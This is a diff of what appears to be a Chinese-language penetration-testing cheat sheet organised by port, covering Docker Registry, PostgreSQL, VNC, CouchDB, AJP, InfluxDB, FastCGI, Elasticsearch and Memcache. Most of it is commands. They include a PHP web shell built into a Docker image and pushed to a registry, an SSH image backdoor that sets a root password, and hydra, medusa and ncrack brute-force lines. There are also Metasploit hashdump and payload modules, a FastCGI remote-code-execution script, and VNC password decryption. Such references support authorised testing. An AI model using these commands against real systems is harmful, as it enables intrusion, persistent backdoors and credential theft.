-<h4 id="暴力破解-11"><a href="#暴力破解-11" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt  -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst 10.10.10.10 -s 5000 https-get &#x2F;v2&#x2F;
+docker exec -it 7d3a81fe42d7 bash  #Get ash shell inside docker container</code></pre>
+<h4 id="暴力破解-11"><a href="#暴力破解-11" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt  -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst 10.10.10.10 -s 5000 https-get &#x2F;v2&#x2F;
 
 ---
 
-curl -k -u username:password https:&#x2F;&#x2F;ip:5000&#x2F;v2&#x2F;_catalog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h4><pre class="line-numbers language-none"><code class="language-none">1）创建后门：shell.php
+curl -k -u username:password https:&#x2F;&#x2F;ip:5000&#x2F;v2&#x2F;_catalog</code></pre>
+<h4 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h4><pre class="language-none"><code class="language-none">1）创建后门：shell.php
 
 &lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;
 
@@ -1171,8 +1171,8 @@ RUN chmod 777 &#x2F;app&#x2F;shell.php
 
 docker build -t IP:5000&#x2F;wordpress .
 docker images
-docker push registry:5000&#x2F;wordpress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="SSH镜像后门"><a href="#SSH镜像后门" class="headerlink" title="SSH镜像后门"></a>SSH镜像后门</h4><pre class="line-numbers language-none"><code class="language-none">1) 如果通过Docker Registry发现SSH镜像，可设置后门
+docker push registry:5000&#x2F;wordpress</code></pre>
+<h4 id="SSH镜像后门"><a href="#SSH镜像后门" class="headerlink" title="SSH镜像后门"></a>SSH镜像后门</h4><pre class="language-none"><code class="language-none">1) 如果通过Docker Registry发现SSH镜像，可设置后门
 
 docker pull 10.10.10.10:5000&#x2F;sshd-docker-cli
 docker run -d 10.10.10.10:5000&#x2F;sshd-docker-cli
@@ -1194,15 +1194,15 @@ RUN echo root:password | chpasswd
 docker build -t 10.10.10.10:5000&#x2F;sshd-docker-cli .
 docker images
 docker push registry:5000&#x2F;sshd-docker-cli #Push it
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/5000-pentesting-docker-registry">https://book.hacktricks.xyz/pentesting/5000-pentesting-docker-registry</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/Syzik/DockerRegistryGrabber">https://github.com/Syzik/DockerRegistryGrabber</a></li>
 </ul>
-<h3 id="5432-5433-Postgresql"><a href="#5432-5433-Postgresql" class="headerlink" title="5432-5433: Postgresql"></a>5432-5433: Postgresql</h3><h4 id="服务指纹-5"><a href="#服务指纹-5" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="line-numbers language-none"><code class="language-none">PORT     STATE SERVICE
-5432&#x2F;tcp open  pgsql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="连接命令"><a href="#连接命令" class="headerlink" title="连接命令"></a>连接命令</h4><pre class="line-numbers language-none"><code class="language-none">psql -U &lt;myuser&gt;   # Open psql console with user
+<h3 id="5432-5433-Postgresql"><a href="#5432-5433-Postgresql" class="headerlink" title="5432-5433: Postgresql"></a>5432-5433: Postgresql</h3><h4 id="服务指纹-5"><a href="#服务指纹-5" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="language-none"><code class="language-none">PORT     STATE SERVICE
+5432&#x2F;tcp open  pgsql</code></pre>
+<h4 id="连接命令"><a href="#连接命令" class="headerlink" title="连接命令"></a>连接命令</h4><pre class="language-none"><code class="language-none">psql -U &lt;myuser&gt;   # Open psql console with user
 psql -h &lt;host&gt; -U &lt;username&gt; -d &lt;database&gt;   # Remote connection
 psql -h &lt;host&gt; -p &lt;port&gt; -U &lt;username&gt; -W &lt;password&gt; &lt;database&gt;   # Remote connection
 
@@ -1257,27 +1257,27 @@ SELECT
         WHERE m.member &#x3D; r.oid) as memberof
 , r.rolreplication
 FROM pg_catalog.pg_roles r
-ORDER BY 1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="服务枚举-9"><a href="#服务枚举-9" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">msf&gt; use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_version
-msf&gt; use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_dbname_flag_injection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-12"><a href="#暴力破解-12" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt &lt;IP&gt; postgres
+ORDER BY 1;</code></pre>
+<h4 id="服务枚举-9"><a href="#服务枚举-9" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">msf&gt; use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_version
+msf&gt; use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_dbname_flag_injection</code></pre>
+<h4 id="暴力破解-12"><a href="#暴力破解-12" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">hydra -L &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt &lt;IP&gt; postgres
 medusa -h &lt;IP&gt; –U &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt –M postgres
 ncrack –v –U &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt &lt;IP&gt;:5432
 patator pgsql_login host&#x3D;&lt;IP&gt; user&#x3D;FILE0 0&#x3D;&#x2F;root&#x2F;Desktop&#x2F;user.txt password&#x3D;FILE1 1&#x3D;&#x2F;root&#x2F;Desktop&#x2F;pass.txt
 use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_login
-nmap -sV --script pgsql-brute --script-args userdb&#x3D;&#x2F;var&#x2F;usernames.txt,passdb&#x3D;&#x2F;var&#x2F;passwords.txt -p 5432 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="攻击利用-3"><a href="#攻击利用-3" class="headerlink" title="攻击利用"></a>攻击利用</h4><pre class="line-numbers language-none"><code class="language-none">msf&gt; use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_hashdump
+nmap -sV --script pgsql-brute --script-args userdb&#x3D;&#x2F;var&#x2F;usernames.txt,passdb&#x3D;&#x2F;var&#x2F;passwords.txt -p 5432 &lt;IP&gt;</code></pre>
+<h4 id="攻击利用-3"><a href="#攻击利用-3" class="headerlink" title="攻击利用"></a>攻击利用</h4><pre class="language-none"><code class="language-none">msf&gt; use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_hashdump
 msf&gt; use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_schemadump
 msf&gt; use auxiliary&#x2F;admin&#x2F;postgres&#x2F;postgres_readfile
 msf&gt; use exploit&#x2F;linux&#x2F;postgres&#x2F;postgres_payload
-msf&gt; use exploit&#x2F;windows&#x2F;postgres&#x2F;postgres_payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+msf&gt; use exploit&#x2F;windows&#x2F;postgres&#x2F;postgres_payload</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-postgresql">https://book.hacktricks.xyz/pentesting/pentesting-postgresql</a></li>
 </ul>
-<h3 id="5800-x2F-5801-x2F-5900-x2F-5901-VNC"><a href="#5800-x2F-5801-x2F-5900-x2F-5901-VNC" class="headerlink" title="5800&#x2F;5801&#x2F;5900&#x2F;5901-VNC"></a>5800&#x2F;5801&#x2F;5900&#x2F;5901-VNC</h3><h4 id="服务枚举-10"><a href="#服务枚举-10" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p &lt;PORT&gt; &lt;IP&gt;
-msf&gt; use auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_none_auth<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-13"><a href="#暴力破解-13" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc
+<h3 id="5800-x2F-5801-x2F-5900-x2F-5901-VNC"><a href="#5800-x2F-5801-x2F-5900-x2F-5901-VNC" class="headerlink" title="5800&#x2F;5801&#x2F;5900&#x2F;5901-VNC"></a>5800&#x2F;5801&#x2F;5900&#x2F;5901-VNC</h3><h4 id="服务枚举-10"><a href="#服务枚举-10" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p &lt;PORT&gt; &lt;IP&gt;
+msf&gt; use auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_none_auth</code></pre>
+<h4 id="暴力破解-13"><a href="#暴力破解-13" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">hydra -L &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc
 medusa -h &lt;IP&gt; –u root -P &#x2F;root&#x2F;Desktop&#x2F;pass.txt –M vnc
 ncrack -V --user root -P &#x2F;root&#x2F;Desktop&#x2F;pass.txt &lt;IP&gt;:&gt;POR&gt;T
 patator vnc_login host&#x3D;&lt;IP&gt; password&#x3D;FILE0 0&#x3D;&#x2F;root&#x2F;Desktop&#x2F;pass.txt –t 1 –x retry:fgep!&#x3D;&#39;Authentication failure&#39; --max-retries 0 –x quit:code&#x3D;0use auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_login
@@ -1286,21 +1286,21 @@ nmap -sV --script pgsql-brute --script-args userdb&#x3D;&#x2F;var&#x2F;usernames
 #Metasploit
 use auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_login
 set RHOSTS &lt;ip&gt;
-set PASS_FILE &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;passwords.lst<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="VNC连接"><a href="#VNC连接" class="headerlink" title="VNC连接"></a>VNC连接</h4><pre class="line-numbers language-none"><code class="language-none">vncviewer [-passwd passwd.txt] &lt;IP&gt;::5901<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="VNC解密"><a href="#VNC解密" class="headerlink" title="VNC解密"></a>VNC解密</h4><pre class="line-numbers language-none"><code class="language-none">默认密码存储位置: ~&#x2F;.vnc&#x2F;passwd
+set PASS_FILE &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;passwords.lst</code></pre>
+<h4 id="VNC连接"><a href="#VNC连接" class="headerlink" title="VNC连接"></a>VNC连接</h4><pre class="language-none"><code class="language-none">vncviewer [-passwd passwd.txt] &lt;IP&gt;::5901</code></pre>
+<h4 id="VNC解密"><a href="#VNC解密" class="headerlink" title="VNC解密"></a>VNC解密</h4><pre class="language-none"><code class="language-none">默认密码存储位置: ~&#x2F;.vnc&#x2F;passwd
 
 # 解密：https:&#x2F;&#x2F;github.com&#x2F;jeroennijhof&#x2F;vncpwd
 
 make
-vncpwd &lt;vnc password file&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+vncpwd &lt;vnc password file&gt;</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-vnc">https://book.hacktricks.xyz/pentesting/pentesting-vnc</a></li>
 </ul>
-<h3 id="5984-x2F-6984-CouchDB"><a href="#5984-x2F-6984-CouchDB" class="headerlink" title="5984&#x2F;6984-CouchDB"></a>5984&#x2F;6984-CouchDB</h3><h4 id="自动枚举"><a href="#自动枚举" class="headerlink" title="自动枚举"></a>自动枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script couchdb-databases,couchdb-stats -p &lt;PORT&gt; &lt;IP&gt;
-msf&gt; use auxiliary&#x2F;scanner&#x2F;couchdb&#x2F;couchdb_enum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="手工枚举"><a href="#手工枚举" class="headerlink" title="手工枚举"></a>手工枚举</h4><pre class="line-numbers language-none"><code class="language-none">1）Banner获取
+<h3 id="5984-x2F-6984-CouchDB"><a href="#5984-x2F-6984-CouchDB" class="headerlink" title="5984&#x2F;6984-CouchDB"></a>5984&#x2F;6984-CouchDB</h3><h4 id="自动枚举"><a href="#自动枚举" class="headerlink" title="自动枚举"></a>自动枚举</h4><pre class="language-none"><code class="language-none">nmap -sV --script couchdb-databases,couchdb-stats -p &lt;PORT&gt; &lt;IP&gt;
+msf&gt; use auxiliary&#x2F;scanner&#x2F;couchdb&#x2F;couchdb_enum</code></pre>
+<h4 id="手工枚举"><a href="#手工枚举" class="headerlink" title="手工枚举"></a>手工枚举</h4><pre class="language-none"><code class="language-none">1）Banner获取
 curl http:&#x2F;&#x2F;IP:5984&#x2F;
 
 2）Database List
@@ -1317,20 +1317,20 @@ curl http:&#x2F;&#x2F;localhost:5984&#x2F;simpsons&#x2F;_all_docs
 
 5）Read Document
 curl -X GET http:&#x2F;&#x2F;IP:5984&#x2F;&#123;dbname&#125;&#x2F;&#123;id&#125;
-curl http:&#x2F;&#x2F;localhost:5984&#x2F;simpsons&#x2F;f0042ac3dc4951b51f056467a1000dd9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-14"><a href="#暴力破解-14" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">msf&gt; use auxiliary&#x2F;scanner&#x2F;couchdb&#x2F;couchdb_login
-hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst localhost -s 5984 http-get &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+curl http:&#x2F;&#x2F;localhost:5984&#x2F;simpsons&#x2F;f0042ac3dc4951b51f056467a1000dd9</code></pre>
+<h4 id="暴力破解-14"><a href="#暴力破解-14" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">msf&gt; use auxiliary&#x2F;scanner&#x2F;couchdb&#x2F;couchdb_login
+hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst localhost -s 5984 http-get &#x2F;</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html">https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html</a></li>
 <li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution">https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution</a></li>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/5984-pentesting-couchdb">https://book.hacktricks.xyz/pentesting/5984-pentesting-couchdb</a></li>
 </ul>
-<h3 id="8009-AJP"><a href="#8009-AJP" class="headerlink" title="8009-AJP"></a>8009-AJP</h3><h4 id="服务指纹-6"><a href="#服务指纹-6" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="line-numbers language-none"><code class="language-none">PORT     STATE SERVICE
-8009&#x2F;tcp open  ajp13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="服务枚举-11"><a href="#服务枚举-11" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="暴力破解-15"><a href="#暴力破解-15" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">nmap --script ajp-brute -p 8009 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="8086-InfluxDB"><a href="#8086-InfluxDB" class="headerlink" title="8086-InfluxDB"></a>8086-InfluxDB</h3><h4 id="认证枚举"><a href="#认证枚举" class="headerlink" title="认证枚举"></a>认证枚举</h4><pre class="line-numbers language-none"><code class="language-none">1）无认证
+<h3 id="8009-AJP"><a href="#8009-AJP" class="headerlink" title="8009-AJP"></a>8009-AJP</h3><h4 id="服务指纹-6"><a href="#服务指纹-6" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="language-none"><code class="language-none">PORT     STATE SERVICE
+8009&#x2F;tcp open  ajp13</code></pre>
+<h4 id="服务枚举-11"><a href="#服务枚举-11" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 &lt;IP&gt;</code></pre>
+<h4 id="暴力破解-15"><a href="#暴力破解-15" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">nmap --script ajp-brute -p 8009 &lt;IP&gt;</code></pre>
+<h3 id="8086-InfluxDB"><a href="#8086-InfluxDB" class="headerlink" title="8086-InfluxDB"></a>8086-InfluxDB</h3><h4 id="认证枚举"><a href="#认证枚举" class="headerlink" title="认证枚举"></a>认证枚举</h4><pre class="language-none"><code class="language-none">1）无认证
 influx -host &#39;host name&#39; -port &#39;port #&#39;
 &gt; use _internal
 
@@ -1338,15 +1338,15 @@ influx -host &#39;host name&#39; -port &#39;port #&#39;
 influx –username influx –password influx_pass
 
 3）自动化枚举
-msf6 &gt; use auxiliary&#x2F;scanner&#x2F;http&#x2F;influxdb_enum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><pre class="line-numbers language-none"><code class="language-none">&gt; show databases
+msf6 &gt; use auxiliary&#x2F;scanner&#x2F;http&#x2F;influxdb_enum</code></pre>
+<h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><pre class="language-none"><code class="language-none">&gt; show databases
 
 &gt; show measurements  #显示SQL表
 
 &gt; show field keys    #显示字段键值：列
 
-&gt; select * from cpu  #dump the table<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="9000-FastCGI"><a href="#9000-FastCGI" class="headerlink" title="9000-FastCGI"></a>9000-FastCGI</h3><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+&gt; select * from cpu  #dump the table</code></pre>
+<h3 id="9000-FastCGI"><a href="#9000-FastCGI" class="headerlink" title="9000-FastCGI"></a>9000-FastCGI</h3><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><pre class="language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
 
 PAYLOAD&#x3D;&quot;&lt;?php echo &#39;&lt;!--&#39;; system(&#39;whoami&#39;); echo &#39;--&gt;&#39;;&quot;
 FILENAMES&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;public&#x2F;index.php&quot; # Exisiting file path
@@ -1362,17 +1362,17 @@ for FN in $FILENAMES; do
       cgi-fcgi -bind -connect $HOST:9000 &amp;&gt; $OUTPUT
 
     cat $OUTPUT
-done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+done</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></li>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi">https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass&#x2F;disable_functions-bypass-php-fpm-fastcgi</a></li>
 </ul>
-<h3 id="9200-x2F-9300-Elasticsearch"><a href="#9200-x2F-9300-Elasticsearch" class="headerlink" title="9200&#x2F;9300: Elasticsearch"></a>9200&#x2F;9300: Elasticsearch</h3><h4 id="认证验证"><a href="#认证验证" class="headerlink" title="认证验证"></a>认证验证</h4><pre class="line-numbers language-none"><code class="language-none">curl -X GET &quot;ELASTICSEARCH-SERVER:9200&#x2F;_xpack&#x2F;security&#x2F;user&quot;  #无认证
+<h3 id="9200-x2F-9300-Elasticsearch"><a href="#9200-x2F-9300-Elasticsearch" class="headerlink" title="9200&#x2F;9300: Elasticsearch"></a>9200&#x2F;9300: Elasticsearch</h3><h4 id="认证验证"><a href="#认证验证" class="headerlink" title="认证验证"></a>认证验证</h4><pre class="language-none"><code class="language-none">curl -X GET &quot;ELASTICSEARCH-SERVER:9200&#x2F;_xpack&#x2F;security&#x2F;user&quot;  #无认证
 
-curl -X GET http:&#x2F;&#x2F;user:password@IP:9200&#x2F;  #有认证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-16"><a href="#暴力破解-16" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst localhost -s 9200 http-get &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h4><pre class="line-numbers language-none"><code class="language-none">#List all roles on the system:
+curl -X GET http:&#x2F;&#x2F;user:password@IP:9200&#x2F;  #有认证</code></pre>
+<h4 id="暴力破解-16"><a href="#暴力破解-16" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst localhost -s 9200 http-get &#x2F;</code></pre>
+<h4 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h4><pre class="language-none"><code class="language-none">#List all roles on the system:
 curl -X GET &quot;ELASTICSEARCH-SERVER:9200&#x2F;_security&#x2F;role&quot;
 
 #List all users on the system:
@@ -1381,12 +1381,12 @@ curl -X GET &quot;ELASTICSEARCH-SERVER:9200&#x2F;_security&#x2F;user&quot;
 #Get more information about the rights of an user:
 curl -X GET &quot;ELASTICSEARCH-SERVER:9200&#x2F;_security&#x2F;user&#x2F;&lt;USERNAME&gt;&quot;
 
-msf &gt; use auxiliary&#x2F;scanner&#x2F;elasticsearch&#x2F;indices_enum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+msf &gt; use auxiliary&#x2F;scanner&#x2F;elasticsearch&#x2F;indices_enum</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch">https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch</a></li>
 </ul>
-<h3 id="11211-Memcache"><a href="#11211-Memcache" class="headerlink" title="11211-Memcache"></a>11211-Memcache</h3><h4 id="服务枚举-12"><a href="#服务枚举-12" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">echo &quot;version&quot; | nc -vn -w 1 &lt;IP&gt; 11211      #Get version
+<h3 id="11211-Memcache"><a href="#11211-Memcache" class="headerlink" title="11211-Memcache"></a>11211-Memcache</h3><h4 id="服务枚举-12"><a href="#服务枚举-12" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">echo &quot;version&quot; | nc -vn -w 1 &lt;IP&gt; 11211      #Get version
 echo &quot;stats&quot; | nc -vn -w 1 &lt;IP&gt; 11211        #Get status
 echo &quot;stats slabs&quot; | nc -vn -w 1 &lt;IP&gt; 11211  #Get slabs
 echo &quot;stats items&quot; | nc -vn -w 1 &lt;IP&gt; 11211  #Get items of slabs with info
@@ -1395,19 +1395,19 @@ echo &quot;get &lt;item_name&gt;&quot; | nc -vn -w 1 &lt;IP&gt; 11211  #Get save
 
 #This php will just dump the keys, you need to use &quot;get &lt;item_name&gt; later&quot;
 sudo apt-get install php-memcached
-php -r &#39;$c &#x3D; new Memcached(); $c-&gt;addServer(&quot;localhost&quot;, 11211); var_dump( $c-&gt;getAllKeys() );&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="工具枚举"><a href="#工具枚举" class="headerlink" title="工具枚举"></a>工具枚举</h4><pre class="line-numbers language-none"><code class="language-none">sudo apt install libmemcached-tools
+php -r &#39;$c &#x3D; new Memcached(); $c-&gt;addServer(&quot;localhost&quot;, 11211); var_dump( $c-&gt;getAllKeys() );&#39;</code></pre>
+<h4 id="工具枚举"><a href="#工具枚举" class="headerlink" title="工具枚举"></a>工具枚举</h4><pre class="language-none"><code class="language-none">sudo apt install libmemcached-tools
 memcstat --servers&#x3D;127.0.0.1 #Get stats
 memcdump --servers&#x3D;127.0.0.1 #Get all items
-memccat  --servers&#x3D;127.0.0.1 &lt;item1&gt; &lt;item2&gt; &lt;item3&gt; #Get info inside the item(s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="自动化-1"><a href="#自动化-1" class="headerlink" title="自动化"></a>自动化</h4><pre class="line-numbers language-none"><code class="language-none">nmap -n -sV --script memcached-info -p 11211 &lt;IP&gt;    #Just gather info
+memccat  --servers&#x3D;127.0.0.1 &lt;item1&gt; &lt;item2&gt; &lt;item3&gt; #Get info inside the item(s)</code></pre>
+<h4 id="自动化-1"><a href="#自动化-1" class="headerlink" title="自动化"></a>自动化</h4><pre class="language-none"><code class="language-none">nmap -n -sV --script memcached-info -p 11211 &lt;IP&gt;    #Just gather info
 msf &gt; use auxiliary&#x2F;gather&#x2F;memcached_extractor       #Extracts saved data
-msf &gt; use auxiliary&#x2F;scanner&#x2F;memcached&#x2F;memcached_amp  #Check is UDP DDoS amplification attack is possible <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h3 id="15672-RabbitMQ-Management"><a href="#15672-RabbitMQ-Management" class="headerlink" title="15672-RabbitMQ Management"></a>15672-RabbitMQ Management</h3><h4 id="启动插件"><a href="#启动插件" class="headerlink" title="启动插件"></a>启动插件</h4><pre class="line-numbers language-none"><code class="language-none">rabbitmq-plugins enable rabbitmq_management
